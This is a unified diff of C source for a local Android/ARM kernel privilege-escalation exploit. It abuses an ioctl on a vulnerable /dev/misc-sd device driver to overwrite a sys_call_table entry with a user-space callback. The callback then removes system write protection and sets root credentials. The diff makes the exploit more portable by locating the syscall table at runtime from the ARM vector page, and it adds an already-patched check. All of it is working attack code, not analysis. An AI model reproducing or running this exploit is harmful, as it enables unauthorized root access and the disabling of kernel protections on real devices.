@@ -4,6 +4,7 @@
 #include <sys/mman.h>
 #include <unistd.h>
 #include <sys/syscall.h>
+#include <sys/prctl.h>
 
 #define DEV "/dev/misc-sd"
 #define KERNEL_START     0xc0008000
@@ -128,7 +129,10 @@ int mod_wp()
                                 tmp = *p << 20;
                                 t = (tmp >> 20) + (unsigned int)p;
                                 t = *(t + 2);
-                                if (*t == 0x62636d6d) {
+                                if (*t == 0x41414141) {
+                                        return 2;
+                                }
+                                else if (*t == 0x62636d6d) {
                                 //if (*t == 0x41414141) {
                                         *t = 0x41414141;
                                         /*
@@ -232,12 +236,35 @@ int root_by_set_cred(void)
         return 0;
 }
 
+unsigned long find_syscall_table()
+{
+        int ret;
+        unsigned long addr;
+
+        addr = 0xffff0008 + 8 + (*(unsigned long*)0xffff0008 & 0xfff);
+        addr = *(unsigned long*)addr;
+
+        ret = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
+        if (ret > 0)
+                addr += 0x18;
+        /* ret = syscall(__NR_semop, , 0, 0); */
+        /* printf("ret = %d\n", ret); */
+        /* if (ret == -1) */
+        /*         perror("semop:"); */
+
+        /* vector_swi +  __sys_trace + __sys_trace_return + __cr_agignment */
+        addr += 0x74 + 0x2c + 0x20 + 0x4;
+
+        return addr;
+}
+
 void set_call_back(int fd, unsigned target, unsigned addr)
 {
 
         unsigned *t;
         unsigned char *base;
         struct msdc_ioctl mi;
+        unsigned long syscall_table;
 
         t = (unsigned int *)target;
 
@@ -246,14 +273,16 @@ void set_call_back(int fd, unsigned target, unsigned addr)
         mi.host_num = 0x24000000;
         mi.iswrite = 1;
 
-        /* sys_call_table sys_pciconfig_iobase*/        
-        base = 0xc000e6c4 + 4 * 0x10f;
+        /* sys_call_table sys_pciconfig_iobase*/
+        syscall_table = find_syscall_table();
+        //printf("find sys_call_table: %p\n", find_syscall_table());
+
+        base = syscall_table + sizeof(unsigned long*) * __NR_pciconfig_iobase;
         *t = base;
         mi.cmd_pu_driving = (addr >> 8) & 0xff;
         mi.dat_pu_driving = (addr >> 16) & 0xff;
         mi.clk_pu_driving = addr & 0xff;
         ioctl(fd, 0, &mi);
-
 
         *t = (unsigned)base + 3;
         mi.cmd_pu_driving = addr & 0xff;
@@ -277,10 +306,6 @@ int main()
         int ret;
         unsigned int *p;
         unsigned int i;
-
-
-        /* root_by_set_cred(); */
-        /* return 0; */
 
         fd = open(DEV, O_RDONLY);
         if (fd < 0) {
@@ -327,7 +352,10 @@ int main()
         set_call_back(fd, 0x52000000, (unsigned)mod_wp);
 
         ret = syscall(0x110, 0, 0, 0, 0);
-        if (ret == 1) {
+        if (ret == 2) {
+                printf("system write protection already removed!\n");
+        }
+        else if (ret == 1) {
                 printf("remove system write protection success!\n");
         }
         else {
